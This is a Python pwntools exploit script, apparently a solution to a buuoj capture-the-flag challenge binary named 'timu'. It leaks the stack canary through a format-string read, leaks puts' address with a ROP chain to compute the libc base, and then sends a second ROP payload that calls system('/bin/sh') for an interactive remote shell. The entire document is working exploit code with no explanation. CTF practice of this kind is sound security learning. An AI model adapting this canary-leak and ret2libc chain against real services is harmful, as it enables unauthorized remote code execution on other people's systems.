from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",29759)
elf=ELF("./timu")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main=0x0000000000400887
pop_rdi_ret=0x0000000000400993

sh.recvuntil(b"I'll give u some gift to help u!\n")
sh.sendline(b"%7$p")
sh.recv(2)
canary=sh.recv(16)
canary=int(canary,16)
print("canary=",hex(canary))

sh.recvuntil(b"Pull up your sword and tell me u story!\n")
payload=0x18*b'a'+p64(canary)+0x8*b'a'+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
sh.sendline(payload)
puts_addr=u64(sh.recv(6).ljust(8,b'\x00'))
print("puts_addr=",hex(puts_addr))

libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh"))

sh.recvuntil(b"Pull up your sword and tell me u story!\n")
payload1=0x18*b'a'+p64(canary)+0x8*b'a'+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)+p64(0)
sh.sendline(payload1)
sh.interactive()
